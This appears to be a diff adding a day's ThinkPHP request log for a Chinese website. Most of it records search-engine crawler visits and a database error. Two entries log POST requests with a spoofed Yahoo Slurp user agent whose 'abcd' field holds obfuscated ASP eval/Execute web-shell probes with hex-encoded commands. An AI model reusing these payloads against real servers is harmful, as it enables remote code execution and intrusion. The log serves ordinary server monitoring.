+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002052s ]
+[ info ] [ RUN ] app\api\controller\Validate->check_sms_correct[ /www/wwwroot/fw366.cn/application/api/controller/Validate.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:44:04+08:00 ] 203.208.60.87 GET www.fw366.cn/api/sms/send.html
+[运行时间：0.047054s] [吞吐率：21.25req/s] [内存消耗：2,869.73kb] [文件加载：123]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003192s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003220s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'sms',
+    2 => 'send',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..3"',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002058s ]
+[ info ] [ RUN ] app\api\controller\Sms->send[ /www/wwwroot/fw366.cn/application/api/controller/Sms.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:44:32+08:00 ] 203.208.60.117 GET www.fw366.cn/api/ems/send.html
+[运行时间：0.064720s] [吞吐率：15.45req/s] [内存消耗：3,878.08kb] [文件加载：136]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003222s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003250s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'ems',
+    2 => 'send',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..3"',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002056s ]
+[ info ] [ RUN ] app\api\controller\Ems->send[ /www/wwwroot/fw366.cn/application/api/controller/Ems.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ error ] [10501]SQLSTATE[42S22]: Column not found: 1054 Unknown column 'email' in 'where clause'[/www/wwwroot/fw366.cn/thinkphp/library/think/db/Connection.php:385]
+---------------------------------------------------------------
+[ 2020-05-04T10:45:07+08:00 ] 203.208.60.9 GET www.fw366.cn/api/user/resetpwd.html
+[运行时间：0.049185s] [吞吐率：20.33req/s] [内存消耗：2,914.32kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003378s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003407s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'user',
+    2 => 'resetpwd',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..3"',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002033s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn/user.php
+[ info ] [ RUN ] app\api\controller\User->resetpwd[ /www/wwwroot/fw366.cn/application/api/controller/User.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:45:52+08:00 ] 203.208.60.73 GET www.fw366.cn/index/user/register.html
+[运行时间：0.049361s] [吞吐率：20.26req/s] [内存消耗：3,008.49kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003194s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003222s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'register',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..3"',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002058s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/user.php
+[ info ] [ RUN ] app\index\controller\User->register[ /www/wwwroot/fw366.cn/application/index/controller/User.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/user/register.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+  3 => 'captchaType',
+  4 => 'url',
+  5 => 'title',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:48:59+08:00 ] 203.208.60.90 GET www.fw366.cn/captcha.html?r=
+[运行时间：0.041798s] [吞吐率：23.92req/s] [内存消耗：2,300.60kb] [文件加载：112]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003343s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003371s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'method',
+  'method' => 
+  array (
+    0 => '\\think\\captcha\\CaptchaController',
+    1 => 'index',
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..3"',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'r' => '',
+  'id' => NULL,
+)
+[ info ] [ RUN ] think\captcha\CaptchaController->index[ /www/wwwroot/fw366.cn/vendor/topthink/think-captcha/src/CaptchaController.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:54:00+08:00 ] 66.249.68.4 GET www.fw366.cn/index/user/login.html?url=
+[运行时间：0.049283s] [吞吐率：20.29req/s] [内存消耗：3,010.70kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003228s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003256s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..3"',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'url' => '',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002091s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/user.php
+[ info ] [ RUN ] app\index\controller\User->login[ /www/wwwroot/fw366.cn/application/index/controller/User.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/user/login.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+  3 => 'url',
+  4 => 'title',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:54:20+08:00 ] 203.208.60.52 GET www.fw366.cn/index/ajax/lang?callback=define&controllername=user&v=1586304000
+[运行时间：0.048072s] [吞吐率：20.80req/s] [内存消耗：2,908.99kb] [文件加载：121]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003201s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003228s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'ajax',
+    2 => 'lang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.108 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'referer' => 'http://www.fw366.cn/index/user/login.html?url=',
+  'cookie' => 'PHPSESSID=34rs2396km2vp6k9srjtbie5gj',
+  'accept-language' => 'en-US',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'callback' => 'define',
+  'controllername' => 'user',
+  'v' => '1586304000',
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002052s ]
+[ info ] [ RUN ] app\index\controller\Ajax->lang[ /www/wwwroot/fw366.cn/application/index/controller/Ajax.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T12:03:21+08:00 ] 58.83.156.45 POST fw366.cn//api/javascript/javascript.asp
+[运行时间：0.043313s] [吞吐率：23.09req/s] [内存消耗：2,474.64kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000030s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003192s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003219s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'javascript',
+    2 => 'javascript.asp',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '819',
+  'x-forwarded-for' => '58.83.156.45',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '58.83.156.45',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'abcd' => 'Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i+2,2)&"""")""""):i=i+2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""526573706F6E73652E577269746528224C584C2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002040s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T12:03:21+08:00 ] 61.186.172.248 POST fw366.cn//api/javascript/javascript.asp
+[运行时间：0.041786s] [吞吐率：23.93req/s] [内存消耗：2,474.52kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003140s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003167s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'javascript',
+    2 => 'javascript.asp',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '684',
+  'x-forwarded-for' => '61.186.172.248',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '61.186.172.248',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'abcd' => '%u0045%xec%ute%G%loba%l%(Replace("Fu%nct%ion bd(by%V%al s):Fo%r i%=1 T%o Le%n(s) S%te%p 2:c%=M%id(s,i,2):If Is%Nu%meric(M%id(s,i,1)) T%hen:bd%=bd@26@c%hr(""@26@H""@26@c):E%lse:bd%=bd@26@c%hr(""@26@H""@26@c@26@M%id(s,i+2,2)):i%=i+2:E%nd If:Ne%xt:E%nd Fu%nct%ion:E%xecu%te%(bd%(""4f6e204572726f7220526573756d65204e6578743a526573706f6e73652e57726974652022402a6c786c2a40223a526573706F6E73652E577269746528224C584C22293a526573706f6e73652e577269746520222a406c786c402a223a526573706f6e73652e456e64"")%)","@26@",chr(38)))',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002020s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T12:33:46+08:00 ] 49.7.20.119 GET www.fw366.cn/
+[运行时间：0.047457s] [吞吐率：21.07req/s] [内存消耗：2,931.20kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003201s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003228s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'user-agent' => 'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',
+  'accept-encoding' => 'gzip,deflate',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002080s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T12:34:45+08:00 ] 54.36.150.30 GET www.fw366.cn/e/wap/
+[运行时间：0.039364s] [吞吐率：25.40req/s] [内存消耗：2,273.16kb] [文件加载：113]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003222s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003249s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'e',
+    1 => 'wap',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'deflate, gzip, br',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T12:52:06+08:00 ] 54.36.148.43 GET www.fw366.cn/
+[运行时间：0.047930s] [吞吐率：20.86req/s] [内存消耗：2,930.69kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003151s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003179s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'deflate, gzip, br',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002019s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T14:36:36+08:00 ] 54.36.148.167 GET fw366.cn/
+[运行时间：0.048300s] [吞吐率：20.70req/s] [内存消耗：2,930.69kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003181s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003209s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'deflate, gzip, br',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)',
+  'host' => 'fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002032s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T17:06:35+08:00 ] 54.36.148.46 GET www.fw366.cn/71.html
+[运行时间：0.039555s] [吞吐率：25.28req/s] [内存消耗：2,273.17kb] [文件加载：113]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003149s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003176s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '71',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'deflate, gzip, br',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T17:47:58+08:00 ] 144.76.38.10 GET fw366.cn/index/user/register.html
+[运行时间：0.049718s] [吞吐率：20.11req/s] [内存消耗：2,957.78kb] [文件加载：121]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003241s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003269s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'register',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'accept-language' => 'zh',
+  'accept-encoding' => 'br,gzip',
+  'user-agent' => 'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',
+  'accept' => 'text/html,text/plain,text/xml,text/*,application/xml,application/xhtml+xml,application/rss+xml,application/atom+xml,application/rdf+xml,application/php,application/x-php,application/x-httpd-php',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002080s ]
+[ info ] [ RUN ] app\index\controller\User->register[ /www/wwwroot/fw366.cn/application/index/controller/User.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/user/register.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+  3 => 'captchaType',
+  4 => 'url',
+  5 => 'title',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T17:48:00+08:00 ] 144.76.38.10 GET fw366.cn/index/user/register.html?url=
+[运行时间：0.047756s] [吞吐率：20.94req/s] [内存消耗：2,958.30kb] [文件加载：121]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003134s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003162s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'register',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'accept-language' => 'zh',
+  'accept-encoding' => 'br,gzip',
+  'user-agent' => 'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',
+  'accept' => 'text/html,text/plain,text/xml,text/*,application/xml,application/xhtml+xml,application/rss+xml,application/atom+xml,application/rdf+xml,application/php,application/x-php,application/x-httpd-php',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'url' => '',
+)
